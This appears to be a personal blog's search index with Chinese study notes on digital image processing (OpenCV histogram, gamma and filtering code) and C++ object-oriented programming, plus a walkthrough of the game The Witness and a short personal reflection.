<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>数字图像处理学习笔记</title>
    <url>/2023/10/08/%E6%95%B0%E5%AD%97%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86%E8%AF%BE%E7%A8%8B/%E6%95%B0%E5%AD%97%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="图像处理概述"><a href="#图像处理概述" class="headerlink" title="图像处理概述"></a>图像处理概述</h1><p>数字图像具有整数坐标值和整数灰度值</p>
<p>人眼欠调或者过调现象称为<code>马赫带效应</code>，因为人眼的亮度变化并不明显</p>
<span id="more"></span>
<h2 id="数字图像处理三个层次"><a href="#数字图像处理三个层次" class="headerlink" title="数字图像处理三个层次"></a>数字图像处理三个层次</h2><ol>
<li>低级图像处理</li>
<li>中级图像处理</li>
<li>高级图像处理</li>
</ol>
<h2 id="空域滤波与领域运算"><a href="#空域滤波与领域运算" class="headerlink" title="空域滤波与领域运算"></a>空域滤波与领域运算</h2><p>空域滤波：</p>
<p>$g(x,y)=T[f(x,y) ]$</p>
<p>$f(x,y)$是输出的图形的灰度值，而$g(x,y)$是输出图像的灰度值，$T$是输入图像的像素点$(x,y)$及其指定领域的灰度值进行处理的操作符</p>
<h3 id="均值滤波"><a href="#均值滤波" class="headerlink" title="均值滤波"></a>均值滤波</h3><h3 id="高斯滤波"><a href="#高斯滤波" class="headerlink" title="高斯滤波"></a>高斯滤波</h3><h3 id="阈值领域平滑滤波"><a href="#阈值领域平滑滤波" class="headerlink" title="阈值领域平滑滤波"></a>阈值领域平滑滤波</h3><h2 id="实验2："><a href="#实验2：" class="headerlink" title="实验2："></a>实验2：</h2><ul>
<li><h3 id="编程实现图像的灰度变换，包括图像变暗、图像变亮、降低对比度和直方图均衡化处理"><a href="#编程实现图像的灰度变换，包括图像变暗、图像变亮、降低对比度和直方图均衡化处理" class="headerlink" title="编程实现图像的灰度变换，包括图像变暗、图像变亮、降低对比度和直方图均衡化处理"></a>编程实现图像的灰度变换，包括图像变暗、图像变亮、降低对比度和直方图均衡化处理</h3></li>
</ul>
<p>做法: 使用<code>python</code>的函数，图像变暗、图像变亮、降低对比度方式都可以使用全局线性表变换实现。而直方图均衡化可以调用OpenCV<code>工具包中的</code>equalizehist（）函数来实现。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">plt.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>] = [<span class="string">&#x27;SimHei&#x27;</span>]</span><br><span class="line">plt.figure(figsize=(<span class="number">10</span>, <span class="number">5</span>))</span><br><span class="line">OffsetNumber = <span class="number">150</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hist</span>(<span class="params">image, title</span>):</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">global</span> OffsetNumber</span><br><span class="line">    OffsetNumber = OffsetNumber + <span class="number">1</span></span><br><span class="line">    plt.subplot(OffsetNumber)</span><br><span class="line">    <span class="comment"># 可视化直方图</span></span><br><span class="line">    <span class="comment"># 计算直方图</span></span><br><span class="line">    hist, bins = np.histogram(image.ravel(), <span class="number">256</span>, [<span class="number">0</span>, <span class="number">256</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算像素总数</span></span><br><span class="line">    total_pixels = <span class="built_in">len</span>(image.ravel())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算概率直方图</span></span><br><span class="line">    hist_probability = hist / total_pixels</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 绘制概率直方图</span></span><br><span class="line">    plt.hist(bins[:-<span class="number">1</span>], bins, weights=hist_probability, rwidth=<span class="number">0.8</span>)</span><br><span class="line">    plt.xlabel(<span class="string">&#x27;灰度级别&#x27;</span>)</span><br><span class="line">    plt.ylabel(<span class="string">&#x27;概率&#x27;</span>)</span><br><span class="line">    plt.ylim([<span class="number">0</span>, <span class="number">0.04</span>])</span><br><span class="line">    plt.title(title)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以灰度模式打开dog.png图片</span></span><br><span class="line">image = cv2.imread(<span class="string">&quot;dog.png&quot;</span>,cv2.IMREAD_GRAYSCALE)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 图像变亮或者变暗</span></span><br><span class="line">factor = <span class="number">0.4</span>  <span class="comment"># 调整此值以控制变亮或者变暗程度</span></span><br><span class="line">darkened_image = np.clip(image * factor,<span class="number">0</span>,<span class="number">255</span>).astype(np.uint8)</span><br><span class="line">factor = <span class="number">1.2</span></span><br><span class="line">brighted_image = np.clip(image * factor,<span class="number">0</span>,<span class="number">255</span>).astype(np.uint8)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;darkened_image.jpg&#x27;</span>, darkened_image)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;brighted.jpg&#x27;</span>, brighted_image)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 降低对比度</span></span><br><span class="line"><span class="comment"># 设置线性变换参数</span></span><br><span class="line">alpha = <span class="number">0.5</span>  <span class="comment"># 控制对比度的因子，可以根据需要调整</span></span><br><span class="line">beta = <span class="number">128</span>   <span class="comment"># 控制亮度的偏移值，可以根据需要调整</span></span><br><span class="line"><span class="comment"># 应用线性变换</span></span><br><span class="line">low_contrast_image = cv2.convertScaleAbs(image, alpha=alpha, beta=beta)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;low_contrast_image.jpg&#x27;</span>, low_contrast_image)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 使用函数equalizeHist() 是的直方图均衡化</span></span><br><span class="line">eualImage = cv2.equalizeHist(image)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;output_equalizeHist_image.jpg&#x27;</span>, eualImage)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可视化图片输出过程</span></span><br><span class="line">hist(image,<span class="string">&#x27;原图&#x27;</span>)</span><br><span class="line">hist(darkened_image,<span class="string">&#x27;图像变暗&#x27;</span>)</span><br><span class="line">hist(brighted_image, <span class="string">&#x27;图像变亮&#x27;</span>)</span><br><span class="line">hist(low_contrast_image, <span class="string">&#x27;降低对比度&#x27;</span>)</span><br><span class="line">hist(eualImage,<span class="string">&#x27;直方图均值化&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plt.tight_layout()</span><br><span class="line"></span><br><span class="line">plt.savefig(<span class="string">&quot;Experiment 1.png&quot;</span>)</span><br><span class="line">plt.show()</span><br><span class="line">plt.close</span><br></pre></td></tr></table></figure>
<p>效果:</p>
<ul>
<li><h3 id="编程实现图像的gamma变换"><a href="#编程实现图像的gamma变换" class="headerlink" title="编程实现图像的gamma变换"></a>编程实现图像的gamma变换</h3></li>
</ul>
<p>使用具体做法是先归一化到1，然后gamma作为指数值求出新的像素值再还原</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取图像</span></span><br><span class="line">image = cv2.imread(<span class="string">&quot;a_iris.tif&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义Gamma值</span></span><br><span class="line">gamma = <span class="number">0.5</span>  <span class="comment"># 调整此值以改变Gamma值，通常在0.1到3之间</span></span><br><span class="line">gamma_table = np.array([((i / <span class="number">255.0</span>) ** gamma) * <span class="number">255</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)], dtype=np.uint8)</span><br><span class="line">gamma_corrected_image = cv2.LUT(image, gamma_table)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存Gamma校正后的图像</span></span><br><span class="line">cv2.imwrite(<span class="string">&#x27;gamma_corrected_image.png&#x27;</span>, gamma_corrected_image)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li><h3 id="掌握图像空域滤波方法。修改代码，使用以下滤波算子对图像进行滤波，查看滤波效果，并从平滑-锐化、轮廓模糊-轮廓清晰等方面分析滤波效果"><a href="#掌握图像空域滤波方法。修改代码，使用以下滤波算子对图像进行滤波，查看滤波效果，并从平滑-锐化、轮廓模糊-轮廓清晰等方面分析滤波效果" class="headerlink" title="掌握图像空域滤波方法。修改代码，使用以下滤波算子对图像进行滤波，查看滤波效果，并从平滑/锐化、轮廓模糊/轮廓清晰等方面分析滤波效果"></a>掌握图像空域滤波方法。修改代码，使用以下滤波算子对图像进行滤波，查看滤波效果，并从平滑/锐化、轮廓模糊/轮廓清晰等方面分析滤波效果</h3></li>
</ul>
<p>做法: 抄写书本中给的函数，然后通过修改滤波核查看其效果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取图像</span></span><br><span class="line"><span class="comment">#image = cv2.imread(&quot;a_iris.tif&quot;, cv2.IMREAD_GRAYSCALE)</span></span><br><span class="line">image = cv2.imread(<span class="string">&quot;a_iris.tif&quot;</span>)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;./S/Original image.png&#x27;</span>, image)</span><br><span class="line"></span><br><span class="line">fil0=<span class="number">1</span>/<span class="number">16</span>*np.array([ <span class="comment"># 设置滤波核1</span></span><br><span class="line">    [<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">2</span>,<span class="number">4</span>,<span class="number">2</span>],</span><br><span class="line">    [<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">fil1=<span class="number">1</span>/<span class="number">9</span>*np.array([ <span class="comment"># 设置滤波核2</span></span><br><span class="line">    [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>]</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">fil2=<span class="number">1</span>/<span class="number">10</span>*np.array([ <span class="comment"># 设置滤波核3</span></span><br><span class="line">    [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>],</span><br><span class="line">    [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>]</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">fil3=np.array([ <span class="comment"># 设置滤波核4</span></span><br><span class="line">    [-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>],</span><br><span class="line">    [-<span class="number">1</span>,<span class="number">9</span>,-<span class="number">1</span>],</span><br><span class="line">    [-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>]</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用OpenCV卷积函数</span></span><br><span class="line">ImgSmoothed=cv2.filter2D(image,-<span class="number">1</span>,fil0,borderType=cv2.BORDER_DEFAULT)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;./S/Smoothed image0.png&#x27;</span>, ImgSmoothed)</span><br><span class="line">ImgSmoothed=cv2.filter2D(image,-<span class="number">1</span>,fil1,borderType=cv2.BORDER_DEFAULT)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;./S/Smoothed image1.png&#x27;</span>, ImgSmoothed)</span><br><span class="line">ImgSmoothed=cv2.filter2D(image,-<span class="number">1</span>,fil2,borderType=cv2.BORDER_DEFAULT)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;./S/Smoothed image2.png&#x27;</span>, ImgSmoothed)</span><br><span class="line">ImgSmoothed=cv2.filter2D(image,-<span class="number">1</span>,fil3,borderType=cv2.BORDER_DEFAULT)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;./S/Smoothed image3.png&#x27;</span>, ImgSmoothed)</span><br></pre></td></tr></table></figure>
<ul>
<li><h3 id="首先对图像添加椒盐噪声或高斯噪声，然后对加噪图像进行均值滤波、中值滤波和高斯滤波，滤波效果如实验图4所示，查看并分析滤波效果。"><a href="#首先对图像添加椒盐噪声或高斯噪声，然后对加噪图像进行均值滤波、中值滤波和高斯滤波，滤波效果如实验图4所示，查看并分析滤波效果。" class="headerlink" title="首先对图像添加椒盐噪声或高斯噪声，然后对加噪图像进行均值滤波、中值滤波和高斯滤波，滤波效果如实验图4所示，查看并分析滤波效果。"></a>首先对图像添加椒盐噪声或高斯噪声，然后对加噪图像进行均值滤波、中值滤波和高斯滤波，滤波效果如实验图4所示，查看并分析滤波效果。</h3></li>
</ul>
<p>在python函数中添加其函数,在实现之后查看其效果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_gaussian_noise</span>(<span class="params">image, mean=<span class="number">0</span>, std=<span class="number">25</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;为图像添加高斯噪声&quot;&quot;&quot;</span></span><br><span class="line">    row, col, ch = image.shape</span><br><span class="line">    gauss = np.random.normal(mean, std, (row, col, ch))</span><br><span class="line">    noisy = np.clip(image + gauss, <span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">    noisy = noisy.astype(np.uint8)</span><br><span class="line">    <span class="keyword">return</span> noisy</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_salt_and_pepper_noise</span>(<span class="params">image, salt_prob=<span class="number">0.05</span>, pepper_prob=<span class="number">0.05</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;为图像添加椒盐噪声&quot;&quot;&quot;</span></span><br><span class="line">    noisy = image.copy()</span><br><span class="line">    total_pixels = image.size</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 添加椒噪声</span></span><br><span class="line">    num_salt = <span class="built_in">int</span>(total_pixels * salt_prob)</span><br><span class="line">    salt_coords = [np.random.randint(<span class="number">0</span>, high, num_salt) <span class="keyword">for</span> high <span class="keyword">in</span> image.shape[:<span class="number">2</span>]]</span><br><span class="line">    noisy[salt_coords[<span class="number">0</span>], salt_coords[<span class="number">1</span>], :] = <span class="number">1</span>  <span class="comment"># 白色</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 添加盐噪声</span></span><br><span class="line">    num_pepper = <span class="built_in">int</span>(total_pixels * pepper_prob)</span><br><span class="line">    pepper_coords = [np.random.randint(<span class="number">0</span>, high, num_pepper) <span class="keyword">for</span> high <span class="keyword">in</span> image.shape[:<span class="number">2</span>]]</span><br><span class="line">    noisy[pepper_coords[<span class="number">0</span>], pepper_coords[<span class="number">1</span>], :] = <span class="number">0</span>  <span class="comment"># 黑色</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> noisy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">image = cv2.imread(<span class="string">&#x27;a_iris.tif&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加高斯噪声</span></span><br><span class="line">noisy_image_gaussian = add_gaussian_noise(image)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加椒盐噪声</span></span><br><span class="line">noisy_image_salt_pepper = add_salt_and_pepper_noise(image)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存添加噪声后的图像</span></span><br><span class="line">cv2.imwrite(<span class="string">&#x27;./Work4/noisy_image_gaussian.jpg&#x27;</span>, noisy_image_gaussian)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;./Work4/noisy_image_salt_pepper.jpg&#x27;</span>, noisy_image_salt_pepper)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 均值滤波  </span></span><br><span class="line">blur_gaussian = cv2.blur(noisy_image_gaussian,(<span class="number">3</span>,<span class="number">3</span>))</span><br><span class="line">blur_salt_pepper = cv2.blur(noisy_image_salt_pepper,(<span class="number">3</span>,<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">cv2.imwrite(<span class="string">&#x27;./Work4/blur_gaussian.jpg&#x27;</span>,blur_gaussian)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;./Work4/blur_salt_pepper.jpg&#x27;</span>,blur_salt_pepper)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 中值滤波</span></span><br><span class="line">medianBlur_gaussian = cv2.medianBlur(noisy_image_gaussian,<span class="number">3</span>)</span><br><span class="line">medianBlur_salt_pepper = cv2.medianBlur(noisy_image_salt_pepper,<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">cv2.imwrite(<span class="string">&#x27;./Work4/medianBlur_gaussian.jpg&#x27;</span>,medianBlur_gaussian)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;./Work4/medianBlur_salt_pepper.jpg&#x27;</span>,medianBlur_salt_pepper)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 高斯滤波</span></span><br><span class="line"></span><br><span class="line">GaussianBlur_gaussian = cv2.GaussianBlur(noisy_image_gaussian,(<span class="number">3</span>,<span class="number">3</span>),<span class="number">1</span>)</span><br><span class="line">GaussianBlur_salt_pepper = cv2.GaussianBlur(noisy_image_salt_pepper,(<span class="number">3</span>,<span class="number">3</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">cv2.imwrite(<span class="string">&#x27;./Work4/GaussianBlur_gaussian.jpg&#x27;</span>,GaussianBlur_gaussian)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;./Work4/GaussianBlur_salt_pepper.jpg&#x27;</span>,GaussianBlur_salt_pepper)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id><a href="#" class="headerlink" title=" "></a> </h3><h3 id="计算图像的灰度，均值，方差，以及煽"><a href="#计算图像的灰度，均值，方差，以及煽" class="headerlink" title="计算图像的灰度，均值，方差，以及煽"></a>计算图像的灰度，均值，方差，以及煽</h3><p>计算均值的数学公式: </p>
<script type="math/tex; mode=display">
Mean =  \frac{1}{M \times N}\sum_{i=1}^{M}\sum_{i=1}^{N}I(i,j)</script><p>计算方差的数学公式:</p>
<script type="math/tex; mode=display">
Variance = \frac{1}{M \times N}\sum_{i=1}^{M}\sum_{i=1}^{N}(I(i,j) - Mean)^2</script><p>计算熵的公式:</p>
<script type="math/tex; mode=display">
H(s) = -\sum_{L=0}^{255} p_i*log_2p_i\\
p_i = \frac{i}{(M\times N)} \space,\space i为出现的个数</script><p>共生矩阵：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">uint8 co_array[M][N]</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; row; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; col - <span class="number">1</span>; j++) &#123;</span><br><span class="line">        co_array[image[i][j]][image[i][j+<span class="number">1</span>]]++</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出co_array</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>study</tag>
      </tags>
  </entry>
  <entry>
    <title>游戏-见证者游玩笔记/心得</title>
    <url>/2023/10/07/Playing/%E8%A7%81%E8%AF%81%E8%80%85-The-Witness/</url>
    <content><![CDATA[<p> 由于我是从第六章开始记录的</p>
<h3 id="见证者商店链接"><a href="#见证者商店链接" class="headerlink" title="见证者商店链接"></a><a href="https://store.steampowered.com/app/210970/The_Witness/">见证者商店链接</a></h3><h2 id="攻略视频"><a href="#攻略视频" class="headerlink" title="攻略视频"></a><a href="https://www.bilibili.com/video/BV13F411v7HS">攻略视频</a></h2><h3 id="序章-庭院"><a href="#序章-庭院" class="headerlink" title="序章 庭院"></a>序章 庭院</h3><p>欢迎你，见证者</p>
<h3 id="第一章-樱花树林"><a href="#第一章-樱花树林" class="headerlink" title="第一章 樱花树林"></a>第一章 樱花树林</h3><p>换种视角，也许有新发现</p>
<h3 id="第二章-海岸"><a href="#第二章-海岸" class="headerlink" title="第二章 海岸"></a>第二章 海岸</h3><p>不要总在一颗树上吊死</p>
<h3 id="第三章-沙漠"><a href="#第三章-沙漠" class="headerlink" title="第三章 沙漠"></a>第三章 沙漠</h3><p>相信光明，只为照亮黑暗</p>
<h2 id="第四章-枫叶林"><a href="#第四章-枫叶林" class="headerlink" title="第四章 枫叶林"></a>第四章 枫叶林</h2><p>有时候，眼见不一定为实</p>
<h3 id="第五章-神庙"><a href="#第五章-神庙" class="headerlink" title="第五章 神庙"></a>第五章 神庙</h3><p>看似是绊脚石，实则是铺路石</p>
<h3 id="第六章-湿地"><a href="#第六章-湿地" class="headerlink" title="第六章 湿地"></a>第六章 湿地</h3><p>是时候增加难度了<br>谜题: 每一个由线条围住的区域都满足区域内的图案. 图案允许叠加 - 思路 找到个数再划分区域</p>
<h3 id="第七章-树屋"><a href="#第七章-树屋" class="headerlink" title="第七章 树屋"></a>第七章 树屋</h3><p>逆水行舟，不进则退</p>
<p>八角星谜题和圆形谜题:</p>
<p>八角星谜题: 每一个由线条围住的区域有且只有两个八角星(如果八角星为奇数个, 则需要与<strong>带颜色</strong>的圆形组合)</p>
<p>圆形谜题: 每一个由线条围住的区域有且只有一种颜色, 每个区域颜色之间可以相同</p>
<h3 id="第八章-城堡"><a href="#第八章-城堡" class="headerlink" title="第八章 城堡"></a>第八章 城堡</h3><p>寻得出路，莫忘来时路</p>
<p>迷宫1: 栏杆为障碍,答案为绕过栏杆的路径</p>
<p>迷宫2:杂草为障碍,答案为绕过杂草的路径</p>
<p>迷宫3:水泥路声音为障碍,答案为需要绕过杂音的路径</p>
<p>迷宫4:迷宫与题目不一样, 只要在迷宫内找到一条路径,能够对应上题目的线条即可.</p>
<p>接下来的迷宫都是综合前面的谜题, 把图案画成对应答案的样子</p>
<p>迷宫N:</p>
<p><img src="https://s2.loli.net/2023/10/10/SWj2RLEfBHdkUco.png" alt="迷宫N" style="zoom: 67%;"><br>文字谜题</p>
<p><img src="https://s2.loli.net/2023/10/11/FDMvCLe6YSOsxX3.png" alt="image-20231010214132813" style="zoom: 50%;"></p>
<h3 id="第九章-丛林"><a href="#第九章-丛林" class="headerlink" title="第九章 丛林"></a>第九章 丛林</h3><p>静心，倾听</p>
<p>听音乐, 由音乐判断音阶点, 关卡难度不高(只要能听出来)</p>
<p>音阶越高, 点越小</p>
<p>有几个有干扰选项的. 太难听出来了,实在是.  </p>
<h3 id="第十章-温室"><a href="#第十章-温室" class="headerlink" title="第十章 温室"></a>第十章 温室</h3><p>稍安勿躁,静观其变</p>
<p>通过环境谜题来解密, 透过几层滤镜可以看到其颜色, 表示其方块的正确位置</p>
<h3 id="第十一章-采石场"><a href="#第十一章-采石场" class="headerlink" title="第十一章 采石场"></a>第十一章 采石场</h3><p>唯有无暇, 才能表示完美</p>
<h3 id="第十二章"><a href="#第十二章" class="headerlink" title="第十二章"></a>第十二章</h3><p>温故而知新</p>
<p>该章为谜题大检查</p>
<p><img src="C:/Users/FAN/AppData/Roaming/Typora/typora-user-images/image-20231025214649396.png" alt="image-20231025214649396"> </p>
<p>环境谜题</p>
<p>采石场消去谜题</p>
<p><img src="C:/Users/FAN/AppData/Roaming/Typora/typora-user-images/image-20231025215818539.png" alt="image-20231025215818539"></p>
<p>该谜题: </p>
<ul>
<li>神庙 </li>
<li>树影</li>
<li>沙漠</li>
</ul>
<p><img src="C:/Users/FAN/AppData/Roaming/Typora/typora-user-images/image-20231025215906020.png" alt="image-20231025215906020"></p>
<p><img src="https://s2.loli.net/2023/10/25/y7gKsOBR9Tju64Z.png" alt="image-20231025220212494"></p>
<h3 id="终章-地底"><a href="#终章-地底" class="headerlink" title="终章 地底"></a>终章 地底</h3><p> 此处新增过边谜题</p>
<p><strong>留声机挑战</strong> : 有点困难, 谜题随机, 有的难有的简单.</p>
]]></content>
  </entry>
  <entry>
    <title>想了那么多,不是很想打比赛了</title>
    <url>/2022/06/07/Think/%E4%B8%80%E7%82%B9%E6%83%B3%E6%B3%95/</url>
    <content><![CDATA[<p> 大学快过去一年的时间了,自己的理解和感悟仍然是那么的菜<br>“放弃”并止损<br>做好当下吧</p>
<!--- more -->
]]></content>
  </entry>
  <entry>
    <title>OOP 面向对象编程学习(翁凯)</title>
    <url>/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>翁凯的C++学习笔记1</p>
<h1 id="OOP-面向对象编程学习"><a href="#OOP-面向对象编程学习" class="headerlink" title="OOP 面向对象编程学习"></a><a href="https://www.bilibili.com/video/BV1dE41167hJ">OOP 面向对象编程学习</a></h1><blockquote>
<p> function是一段通过名字调用的代码，它可以接受数据进行操作，并可能会有返回值。    method是一段通过关联在对象上的名字调用的代码。</p>
</blockquote>
<h2 id="第三节-什么是面向对象编程-Object-Oriented"><a href="#第三节-什么是面向对象编程-Object-Oriented" class="headerlink" title="第三节,什么是面向对象编程? Object-Oriented"></a>第三节,什么是面向对象编程? Object-Oriented</h2><p>​        Objects = Attributes + Services;<br>​        Data: the properties or status<br>​        Operations: the functions</p>
<h3 id="Messages-are"><a href="#Messages-are" class="headerlink" title="Messages are"></a>Messages are</h3><ul>
<li>Composed by sender</li>
<li>Interpreted by the receiver</li>
<li>Implemented by methods</li>
</ul>
<h3 id="Messages"><a href="#Messages" class="headerlink" title="Messages"></a>Messages</h3><ul>
<li>May cause receiver to change state</li>
<li>May return results</li>
</ul>
<h3 id="通过-函数-返回值-反馈-对东西进行分析"><a href="#通过-函数-返回值-反馈-对东西进行分析" class="headerlink" title="通过(函数?返回值?)反馈, 对东西进行分析"></a>通过(函数?返回值?)反馈, 对东西进行分析</h3><h4 id="Objects-cat"><a href="#Objects-cat" class="headerlink" title="Objects(cat)"></a>Objects(cat)</h4><ul>
<li>Represent things, events or concepts</li>
<li>respond to messages at run-time</li>
</ul>
<h4 id="Classes-cat-class"><a href="#Classes-cat-class" class="headerlink" title="Classes (cat class)"></a>Classes (cat class)</h4><ul>
<li>Define properties or instances</li>
<li>Act like types in C++</li>
</ul>
<h3 id="Class-gt-define-Object"><a href="#Class-gt-define-Object" class="headerlink" title="Class -&gt;define Object"></a>Class -&gt;define Object</h3><h3 id="Object-gt-is-a-Class"><a href="#Object-gt-is-a-Class" class="headerlink" title="Object-&gt;is a Class"></a>Object-&gt;is a Class</h3><h3 id="总结的面向对象的五种特点"><a href="#总结的面向对象的五种特点" class="headerlink" title="总结的面向对象的五种特点"></a>总结的面向对象的五种特点</h3><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/c++学习\image-20220716141656704.png" alt="image-20220716141656704"></p>
<p>telling program what to do</p>
<h3 id="通过接口对类打交道"><a href="#通过接口对类打交道" class="headerlink" title="通过接口对类打交道"></a>通过接口对类打交道</h3><h4 id="Functions-of-the-interface-接口"><a href="#Functions-of-the-interface-接口" class="headerlink" title="Functions of the interface (接口)"></a>Functions of the interface (接口)</h4><ul>
<li>Communication  (transportation)    </li>
<li>Protection  </li>
</ul>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/c++学习\image-20220716144836781.png" alt="**image-20220716144836781**"></p>
<h3 id="Encapsulation-封装"><a href="#Encapsulation-封装" class="headerlink" title="Encapsulation (封装)"></a>Encapsulation (封装)</h3><ol>
<li>把数据和操作数据的方法封装到里头</li>
<li><strong>隐藏数据和操作的详细信息</strong></li>
<li>限制进入公共方法的入口</li>
</ol>
<ul>
<li>bundle data and methods dealing with these data together in an object.</li>
<li>Hide the details of the data and the action.</li>
<li>Restrict only access to the publicized methods.</li>
</ul>
<h3 id="继承"><a href="#继承" class="headerlink" title="(继承)"></a>(继承)</h3><h3 id="多态性"><a href="#多态性" class="headerlink" title="(多态性)"></a>(多态性)</h3><h1 id="第四节-售票机的例子"><a href="#第四节-售票机的例子" class="headerlink" title="第四节 售票机的例子"></a>第四节 售票机的例子</h1><h2 id="TicketMachine-类"><a href="#TicketMachine-类" class="headerlink" title="TicketMachine 类"></a>TicketMachine 类</h2><p>PRICE<br>BALANCE<br>total;</p>
<hr>
<p>ShowPrompt<br>getMoney<br>printTicket<br>printError</p>
<p>由以上可以做出一个制作类</p>
<p>:: reslover</p>
<p>::  域的解析符号</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">S::f</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	::<span class="built_in">f</span>(); <span class="comment">//Would be recursive otherwisd;</span></span><br><span class="line">    :: a++;<span class="comment">// Select the global &#x27;a</span></span><br><span class="line">    a--; <span class="comment">// The a at class scope</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
